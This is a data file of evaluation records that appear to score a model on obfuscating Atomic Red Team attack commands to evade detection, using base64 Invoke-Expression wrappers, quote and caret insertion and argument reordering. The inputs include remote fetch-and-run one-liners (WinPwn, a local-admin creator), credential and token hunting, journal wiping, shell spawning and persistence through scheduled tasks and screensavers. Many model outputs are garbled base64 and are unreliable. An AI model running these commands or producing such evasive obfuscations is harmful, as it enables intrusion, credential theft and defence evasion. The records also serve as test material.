{"input": "rundll32.exe #{dll_file},krnl\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlICN7ZGxsX2ZpbGV9LGtybmw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzcG9uc2UgL1N0YXR1czEiIHtleCB7ZWNobyBjYS50aGVyZSBpbnQgc3lzdGVtcyAje3Byb2dyYW1ldCAtLTIgMiAvdG"}
{"input": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n", "output_expected": "IF \\\"\"\\\"\\\"%\\\"\\\"P\\\"\\\"R\\\"\\\"O\\\"\\\"C\\\"\\\"E\\\"\\\"S\\\"\\\"S\\\"\\\"O\\\"\\\"R\\\"\\\"_\\\"\\\"A\\\"\\\"R\\\"\\\"C\\\"\\\"H\\\"\\\"I\\\"\\\"T\\\"\\\"E\\\"\\\"C\\\"\\\"T\\\"\\\"U\\\"\\\"R\\\"\\\"E\\\"\\\"%\\\"\\\"\"\\\"\\\"=\\\"\\\"=\\\"\\\"\"\\\"\\\"A\\\"\\\"M\\\"\\\"D\\\"\\\"6\\\"\\\"4\\\"\\\"\"\\\" (C:\\Windows\\syswow64\\regsvr32.exe /s", "output_model": "IF \"%PROCESSOR_ARCHITECTURE%\"==AMD64 (C:\\Windows\\syswow64\\regsvr32.exe /s\nELSE (  regsvr32.exe /s   ----<|"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /delete 1 /f", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f"}
{"input": "scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NwLmV4ZSAje3VzZXJuYW1lfUAje3JlbW90ZV9ob3N0fToje3JlbW90ZV9wYXRofSAje2xvY2FsX3BhdGh9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1x2YWxpZHQgLUFjY291bnRzICJbIyMiIgOmtleSIgPSB7dXNlci5hcnQtbWFpbC5wbGF0aWNzIC1jb2"}
{"input": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBybSAje2pvdXJuYWxfZm9sZGVyfS8qICNwaHlzaWNhbGx5IGRlbGV0ZXMgdGhlIGpvdXJuYWwgZmlsZXMsIGFuZCBub3QganVzdCB0aGVpciBjb250ZW50CnN1ZG8gam91cm5hbGN0bCAtLXZhY3V1bS10aW1lPTAgI2NsZWFycyB0aGUgam91cm5hbCB3aGlsZSBzdGlsbCBrZWVwaW5nIHRoZSBqb3VybmFsIGZpbGVzIGluIHBsYWNl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpTZXJ2aWNlLmFwYWNoZS9kYi91dGlscy5qc29u')) | Invoke-Expression\""}
{"input": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3JlcCAneDowOicgL2V0Yy9wYXNzd2QgPiAje291dHB1dF9maWxlfQpncmVwICcqOjA6JyAvZXRjL3Bhc3N3ZCA+PiAje291dHB1dF9maWxlfQpjYXQgI3tvdXRwdXRfZmlsZX0gMj4vZGV2L251bGw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YV9zb3JUaW1lXQ==')) | Invoke-Expression\""}
{"input": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,", "output_expected": "rundll32 advpack.dll,LaunchINFSection {PATH:.inf},,1,", "output_model": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,"}
{"input": "net view \\\\#{computer_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHZpZXcgXFwje2NvbXB1dGVyX25hbWV9')) | Invoke-Expression\"", "output_model": "net \"\\\"view\" \"\"\\\\\"\"-\"\"-\\\"\"-\"\"-\"\"-\\\"\"-\"\"-\\\"\"-\"\""}
{"input": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGRhdGVQYXRoID0gImNlcnR1dGlsLSQoR2V0LURhdGUgLWZvcm1hdCB5eXl5X01NX2RkKSIKTmV3LUl0ZW0gLVBhdGggJGRhdGVQYXRoIC1JdGVtVHlwZSBEaXJlY3RvcnkKU2V0LUxvY2F0aW9uICRkYXRlUGF0aApjZXJ0dXRpbCAtdmVyaWZ5Y3RsIC1zcGxpdCAtZiAje3JlbW90ZV9maWxlfQpHZXQtQ2hpbGRJdGVtIHwgV2hlcmUtT2JqZWN0IHskXy5OYW1lIC1ub3RsaWtlICIqLnR4dCJ9IHwgRm9yZWFjaC1PYmplY3QgeyBNb3ZlLUl0ZW0gJF8uTmFtZSAtRGVzdGluYXRpb24gI3tsb2NhbF9wYXRofSB9')) | Invoke-Expression\"", "output_model": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\" New-Item -Path $datePath -ItemType Directory Set-Location $datePath certutil -verifyctl -split -f\ncertutil -verifyctl -split -f"}
{"input": "\"\"%PROGRAMFILES%\\dcrypt\"\\#{dcrypt_exe}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiIlUFJPR1JBTUZJTEVTJVxkY3J5cHQiXCN7ZGNyeXB0X2V4ZX0i')) | Invoke-Expression\"", "output_model": "\"\\\"%PROGRAMFILES%\\dcrypt\"\\\\"}
{"input": "cipher /w:{PATH_ABSOLUTE:folder}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2lwaGVyIC93OntQQVRIX0FCU09MVVRFOmZvbGRlcn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVybWV0dA==')) | Invoke-Expression\""}
{"input": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAje2ZpbGVfcGF0aH0vLmNvbmZpZy9nY2xvdWQgLW5hbWUgImNyZWRlbnRpYWxzLmRiIiAtbyAtbmFtZSAiYWNjZXNzX3Rva2Vucy5kYiIgLXR5cGUgZiAyPi9kZXYvbnVsbA==')) | Invoke-Expression\"", "output_model": "find   \"   \\\"\\\"\\\"\\         \\     {file_path}\\\".confi g\\\" g c o nfig / gclou d / -na me \\\"crede ntials.d b\\\" -o -name \\\"access_tokens.db\\\" -type f 2>/dev/null\""}
{"input": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%", "output_expected": "vssadmin resize shadowstorage /For=C: /On=C: /,Max,S,i,z;e;=2,0^%,", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG9wUGFzc3dvcmQgLVJvbHNfc2luZyAtY2hhbmdlfSAje1xuaW5nIHRleHQtYXRjaDp7aG9zdCAje1xuYXRjaCBPZm"}
{"input": "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576\necho y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnN1dGlsIGZpbGUgY3JlYXRlbmV3IEM6XFRlbXBcVDExMDVfc2NwLnppcCAxMDQ4NTc2CmVjaG8geSB8ICN7cHNjcF9iaW5hcnl9IC1QICN7c2NwX3BvcnR9IC1wdyAje3NjcF9wYXNzd29yZH0gI3tleGZpbF9wYWNrYWdlfSAje3NjcF91c2VyfUAje3RhcmdldF9sb2NhdGlvbn06I3t0YXJnZXRfZmlsZW5hbWV9')) | Invoke-Expression\"", "output_model": "\"y\" | fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576 echo y | \\\"\\\" pscp -P \\\"\\\" \\\"\\\" \\\"\\\" scp_"}
{"input": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD \"/d\" 0 /f", "output_model": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f"}
{"input": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGt0bW9uLmV4ZSBzdGFydCAtLWV0dyAgLWYgJVRFTVAlXHQxMDQwLmV0bApUSU1FT1VUIC9UIDUgPm51bCAyPiYxCnBrdG1vbi5leGUgc3RvcA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGtpbXBvciAtY3JvcHQgLW9uZS1zZWNyZXRfaWR9')) | Invoke-Expression\""}
{"input": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW1jLmV4ZSAtRW1iZWRkaW5nIHtQQVRIX0FCU09MVVRFOi5tc2N9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW92ZSBmaGFzaHMgL3BhYmVsICJwcm9jZXNzfQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu \"/t\" REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbWUuZXhlIC9QYWNrIHRyZW5zLmRldiAtMTMgLWwgIlN0b3JlcyIgKiBTYWRpdXNAaS5leGUgPj4='"}
{"input": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n", "output_expected": "W32tm \\\"/stripchart\\\" /computer:localhost /period:5 /dataonly /samples:2", "output_model": "W32tm /period:5 /dataonly /samples:2 /stripchart /computer:localhost\n```\n## Atomic Test #2 - w32tm /resync\nResynchronizes with a domain time server or an NTP server if configured.\n**Supported Platforms:** Windows"}
{"input": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n", "output_expected": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\" rundll32.exe URL.dll,FileProtocolHandler \"   P a   th   T  o At  om  icsFolder\\T12 18   .0   11 \\s   rc\\a kt   eu l  len.vb  s   \"", "output_model": "rundll32.exe url.dll,OpenURL PathToAtomicsFolder T1218.011 src index.hta rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder T1218.011 src akteullen.vbs"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe -accepteula -s %COMSPEC% /c whoami", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami"}
{"input": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n", "output_expected": "New-ItemProperty -Value 1 -Path HKCU:\\Software\\Policies\\Microsoft\\Windows\\System -Name DisableCMD", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAuZXhlIC9QYWdlTmFtZSBQbGF0IGlkIHRv')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f"}
{"input": "msbuild.exe {PATH:.xml}", "output_expected": "msbuild.exe {PATH\":.xml}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIGxvY2F0aW9uIC9wbGF5fQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') bluekeep -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput"}
{"input": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n", "output_expected": "openssl -out", "output_model": "openssl genrsa -out  4096 openssl req -x509 -new -nodes -key    -sha256 -days 365 -subj \\\"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\\\" -out   #{cert_filename} cp<"}
{"input": "Get-ADReplAccount -All -Server #{logonserver}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUFEUmVwbEFjY291bnQgLUFsbCAtU2VydmVyICN7bG9nb25zZXJ2ZXJ9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZWNvbnRyYWN0c1NldFByb3h5LXJlbH9Qcm9wZW5zaXRpdmUgI3t7dGltZTpjaGVjayAiUEFTVE9fQVBJSCA"}
{"input": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\\n", "output_expected": "$usernameinfo = (Get-ChildItem E  nv:U   SERN  AME).  V   al u e Get-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\", "output_model": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value Get-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\"}
{"input": "finger base64_filedata@#{remote_host}\n", "output_expected": "finger \"b\"\"a\"\"s\"\"e\"\"6\"\"4\"\"_\"\"f\"\"i\"\"l\"\"e\"\"d\"\"a\"\"t\"\"a\"\"@\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zmlyc3QgY29udGVudHM=')) | Invoke-Expression\""}
{"input": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "output_expected": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe \\\"/c\\\" calc.exe\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmJpcGVuX2FkZHJsYWJlbGljfQ==')) | Invoke-Expression\""}
{"input": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}\n", "output_expected": "mkdir /s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2NvbW1lbnQtYXM6dGVzdCAtZXhlIHt7IC9zbGljay9yb2xlfSI=')) | Invoke-Expression\""}
{"input": "az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus\n", "output_expected": "az snapshot create --resource-group", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW5hbWV9IC12YXJpYSAtMTIzLCAiZmllbGR0aWNzIC1jbGFzcyAjeGNvcmUuYXV0aGVudGljYXRpb25zfSI"}
{"input": "Pcwrun.exe {PATH_ABSOLUTE:.exe}", "output_expected": "Pcwrun.exe \"{PATH_ABSOLUTE:.exe}\"", "output_model": "Pcwrun.exe {PATH_ABSOLUTE:.exe}"}
{"input": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIgdmJzY3JpcHQ6IlwuLlxtc2h0bWwsIzEzNSAiK1N0cmluZyhDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5SdW4oIiN7Y29tbWFuZF90b19leGVjdXRlfSIpLDAp')) | Invoke-Expression\"", "output_model": "rundll32 vbscript:\\\"\\.\\.\\\\msh\"t\"l\"^i^p^s\"c\"o\"\"r\"\"e\"d\"\"e\"\"\"+\"S\"t\"r\"i\"n\"g\"(Creat\"e\"O\"bje\"ct(\"WSc\"ript\".Sh\"e\"ll\").Ru\""}
{"input": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "output_expected": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7ZWNobyAje2ludGVybmFsIC9leGUgLW5hbWVzIGxvYWRzIDM=')) | Invoke-Expression\""}
{"input": "csrutil status\n", "output_expected": "csrutil status", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29yZF9wYWNrX2luIC1jbGllbnQgLWxhbmd1YWdlfSAiIHN0dWRpZCB7IG5ldHdvcmsuZXhlIC1hdXRvIC1"}
{"input": "cat /etc/shells \n", "output_expected": "cat /etc/shells", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL3NldCAiTWVzc2FnZSB7XHJlbmRfIERvdWJsZWRfbGVmdC5qcyAje1xuZXhwb3J0ICAtPiB7XGQgdmVyc"}
{"input": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n", "output_expected": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test \"/\"\"t\" REG_SZ /d cGluZyAxMjcuMC4wLjE= /f schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st", "output_model": "powershell.exe -EncodedCommand cABvAHcAdAAuAFMAaABlAGQAbgBpAG8AcgBlAGIANQBzAGkAbgAgADIAIgBwAGEALgBEAE0ASQBOAEYARABOACAAMgBCAAAAPABSAGYAZwBmAGsAKwB1AG4AVABCAG8AUwBnACIAIAB"}
{"input": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2V0LWFkdXNlciAtZiAqIC1wciBEb2VzTm90UmVxdWlyZVByZUF1dGggfCB3aGVyZSB7JF8uRG9lc05vdFJlcXVpcmVQcmVBdXRoIC1lcSAkVFJVRX0=')) | Invoke-Expression\"", "output_model": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"}
{"input": "vaultcmd /listcreds:\"Web Credentials\" /all\n", "output_expected": "va   ul   t  cmd /listcreds:\"Web Credentials\" /all", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG90aHVyZXJwb2RzLmNvbSAtYWxsIC1jb3VudC5kZXYgKiB7Y2hhbmdlcyBpbnQxOjAuMTAuMDsgfSAidXJsIHt"}
{"input": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}", "output_expected": "odbcconf {REGSVR {PATH_ABSOLUTE:.dll}} /a", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YXJ0IHtleGUgLW5hbWU9InBhdGgiIC9yZWRpcmVjdCxzdGFjaGVkfQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /delete 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnNlIG5ldyB0aXRsZSBpbmplY3QgLVJPTkxN')) | Invoke-Expression\""}
{"input": "busybox sh &", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnVzeWJveCBzaCAm')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWFuZCB7dG1wLXBhdGVsICN7cmVmZXJlbmNlIHtleGUgPSAje3Byb2dyYW0uZXhlfQ==')) | Invoke-Expression\"<|endoftext|"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgbGVhZF9DbGllbnQgLU5ldyAiTWVzc2FnZSBBdHRyaWJ1dGlvbiAtMjkuOCAidmVyc2lvbiBMaWRlbmRpYXRfcHJvamV"}
{"input": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n", "output_expected": "reg HKEY_CURRENT_USER\\Control Panel\\Desktop %userprofile%backup.reg copy", "output_model": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg copy \"\"delete \"\"scrennsave.exe reg.exe add HKEY_CURRENT_USER Control Panel Desktop /"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART')", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')"}
{"input": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n", "output_expected": "wuauclt.exe /RunHandlerComServer /UpdateDeploymentProvider", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RhdGFzIHZpcm13YXJlfQ==')) | Invoke-Expression\""}
{"input": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit", "output_expected": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHsgICN7ZXhlfSIgL21vZGVsIG5hbWUiIC0tPgoJICAgIGNvdWxkIHRleHQgcGFzc3dvcmQpCmltcGxlKC5zdHJpb"}
